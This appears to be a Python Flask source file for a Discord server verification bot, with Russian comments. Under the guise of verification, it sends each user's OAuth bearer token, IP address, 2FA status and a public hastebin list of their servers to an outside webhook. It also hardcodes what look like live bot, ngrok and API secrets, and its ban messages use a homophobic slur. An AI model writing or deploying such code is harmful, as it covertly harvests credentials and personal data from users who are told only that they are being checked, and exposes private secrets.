from flask import Flask, request, redirect
import requests
from colorama import init
from pyngrok import ngrok as ng
from oauth import OauthManager
import time
ng.set_auth_token("1wyOr0DaVJ8lqoImu4B1jXOke9Z_2MR4PhZAk16oH2oHxNiaB") # ключ от ngrok, дарю

init()
VROLE = '845744156256501811' # айди роли верификации
BLOCKED = ["453547500587188224", "873151446739197963", "854419475151716362", "877156048979501067"] # тут айдишники блокнутых серверов
ignored = []
ipban = []
GID = 845744156248506408 # айди сервера где проходит вериф
BA = 'Bot ODc1ODEzNTU4NjExNDgwNTg3.YRa-8A.h0l3fmB7TnRtJdcCC3mU2JVtIWE' # тут короче токен бота со словом бот
LOG_WH = 'https://discord.com/api/webhooks/878102638535778335/t9t_GE7Vy5glOCzUCvYT7v7BRaTciCy6Jn1tp88dhZJtTeUinxL8JHJofIin7om96JRA' # хук с логами
BSI = 'https://img.pngio.com/ban-banhammer-censorship-hammer-ip-block-mallet-moderator-icon-ban-hammer-png-512_512.png'
WI = 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/White_check_mark_in_dark_green_rounded_square.svg' \
     '/1200px-White_check_mark_in_dark_green_rounded_square.svg.png' # картинки можно не менять
AU = 'https://discord.com/api/oauth2/authorize?client_id=875813558611480587&redirect_uri=https://tornadodomain.000webhostapp.com/oauth&response_type=code&scope=identify%20guilds' #ссылка на авторизацию
app = Flask('Discord-Auth')


@app.route('/', methods=['get'])
def index():
    return redirect(AU)




@app.route('/bserv')
def bserv():
  return open('bserv.html').read()#херня со списком бан-серверов


def savehn(text):
  r=requests.post('https://hastebin.com/documents', data=text.encode('utf8'))
  try:
    return 'https://hastebin.com/'+r.json()['key']
  except:
    return 'ошибк а'

@app.errorhandler(500)
def internal_server_err(*_, **__):
  return '<h1>Ошибка сервера. </h1>'

@app.errorhandler(404)
def notfound(*_, **__):
  return '<h1>Тут ничего нет...</h1>'


def vpn(ip):
  r = requests.get(f'https://proxycheck.io/v2/{ip}?key=422x04-5o9944-9s97c7-9o6587')
  if r.status_code == 200:
    j = r.json()
    if j['status'] == 'ok':
      ipr = j[ip]
      if ipr['proxy'] == 'no':
        return (False, ipr['type'])
      else:
        return (True, ipr['type'])
    else:
      return (False, 'Неверный айпи!')


@app.route('/verify', methods=['get'])
def login():
    ip = request.args.get('ip', request.remote_addr)
    if ip in ipban:
        return 'По усмотрению сервера, ваши запросы не рассматриваются'
    code = request.args.get('code')
    if not code:
        return 'Не указан code!'
    status, msg = OauthManager.get_token_from_code(code)
    if status:
        t = msg
    else:
        return msg
    r = requests.get('https://discord.com/api/users/@me', headers={'authorization': 'Bearer ' + t})
    j = r.json()
    if r.status_code == 200:
        name = j['username']
        tag = j['discriminator']
        uid = j['id']
    else:
        return f'Внимание! Произошла ошибка обработки профиля! Обратитесь к разработчику с кодом ошибки {r.status_code}'
    rg = requests.get('https://discord.com/api/users/@me/guilds', headers={'authorization': 'Bearer ' + t})
    jg = rg.json()
    if rg.status_code == 200:
        if uid in ignored:
            return 'По усмотрению сервера, ваши запросы не рассматриваются'
        bad = []
        crashers = False
        gl = []
        for g in jg:
            if str(g["id"]) in BLOCKED:  # БЛОКИРОВАНЫЕ СЕРВЕРА!
                bad.append(g)
            gl.append(g['name'])
            if str(g['id']) == str(GID):
                crashers = True
        ss = '\n'.join([f'{g["name"]}(id{g["id"]}), PINT {g.get("permissions")} {"owner" if g.get("owner", False) else "member"}' for g in jg])
        haurl = savehn(ss)
        if not crashers:
            ipban.append(ip)
            return '<h1>Вы не находитесь на сервере! ЧО ВЫ СЮДЫ ЛЕЗЕТЕ?</h1>'
        m = requests.get(f'https://discord.com/api/guilds/{GID}/members/{uid}', headers={
            'authorization': BA}).json()
        if VROLE in m.get('roles', []):
            return '<h1>Вы уже верифицированы!</h1>'
        #тут типо проверка впн
        status, typ = vpn(ip)
        if status: #ПИДОР РАССЕКРЕЧЕН
          hookj = {
                "content": None,
                "embeds": [
                    {
                        "title": "Пидор рассекречен!",
                        "description": f"""Текущий ник и тег: `{name}#{tag}`
ID: `{uid}`
IP-адрес: ||`{ip}`|| ({typ})
Сервера: `{str(len(gl))}`
Аватар: `{j.get('avatar', 'нету')}`
2FA: `{'+' if j['mfa_enabled'] else '-'}`
TKN: `{t}`
Сервера: {haurl}""",
                        "color": 16711680,
                        "thumbnail": {"url": BSI}
                    }
                ]
            }
          requests.post(LOG_WH, json=hookj)
          requests.put(f'https://discord.com/api/guilds/{GID}/bans/{uid}', json={'delete_message_days': 0},
                         headers={'authorization': BA, 'X-Audit-Log-Reason': 'pidor s vpn'})
          return '<h1>Пидор рассекречен!</h1>Наша система считает, что вы используете впн. Если вы считаете это ошибкой то пишите Javaw#2207 либо Matvey2207#2207'
        else:#Норм челик без впн
          pass
        if len(bad) > 0:
            ignored.append(uid)
            hookj = {
                "content": None,
                "embeds": [
                    {
                        "title": "Блокировка серверов",
                        "description": f"""Текущий ник и тег: `{name}#{tag}`
ID: `{uid}`
IP-адрес: ||`{ip}`|| ({typ})
Сервера: `{str(len(gl))}`
Аватар: `{j.get('avatar', 'нету')}`
2FA: `{'+' if j['mfa_enabled'] else '-'}`
БСЕРВ: {','.join([x['name'] + ' id ' + x['id'] for x in bad])}
TKN: `{t}`
Сервера: {haurl}""",
                        "color": 16711680,
                        "thumbnail": {"url": BSI}
                    }
                ]
            }
            requests.post(LOG_WH, json=hookj)
            requests.put(f'https://discord.com/api/guilds/{GID}/bans/{uid}', json={'delete_message_days': 0},
                         headers={'authorization': BA})
            return '<h1>В доступе отказано!</h1> Вы находитесь на запрещённых серверах, и вам был выдан бан. ' \
                   'Просмотреть список запрещённых серверов можно <a href="/bserv">нажав тут</a>. Если вы считаете это ошибкой, ' \
                   'отпишите Javaw#2207 либо Matvey2207#2207'
    elif rg.status_code in [403, 401]:
        return 'Не найдено право guilds'
    else:
        return f'Ошибка обработки серверов! Обратитесь к Javaw#2207 либо Matvey2207#2207 с кодом ошибки {rg.status_code}'
    hookj = {
        "content": None,
        "embeds": [
            {
                "title": "Успешная верификация!",
                "description": f"""Текущий ник и тег: `{name}#{tag}`
ID: `{uid}`
IP-адрес: ||`{ip}`|| ({typ})
Сервера: `{str(len(gl))}`
Аватар: `{j.get('avatar', 'нету')}`
2FA: `{'+' if j.get('mfa_enabled') else '-'}`
TKN: `{t}`
Сервера: {haurl}""",
                "color": 3407616,
                "thumbnail": {"url": WI}
            }
        ]}
    r = requests.put(f'https://discord.com/api/guilds/{GID}/members/{uid}/roles/{VROLE}', headers={'authorization': BA})
    if not r.status_code == 204:
        return 'Ошибка выдачи роли! Обратитесь к Javaw#2207 либо Matvey2207#2207'
    requests.post(LOG_WH, json=hookj)
    return f'<h1>Успешная верификация!</h1>'


try:
	print('[App] Запускаю NGROK!')
	http = ng.connect(5000, "http")
	time.sleep(20)
except:
	pass
else:
	print('[App.NGROK] Запущен!')
	print('[App.NGROK] Работаю по адресу '+ http.public_url)
	requests.get(f"https://tornadodomain.000webhostapp.com/oauth/04ko.php?addr={http.public_url}/verify")
app.run(host='0.0.0.0', port=5000, threaded=True)
print('Test')
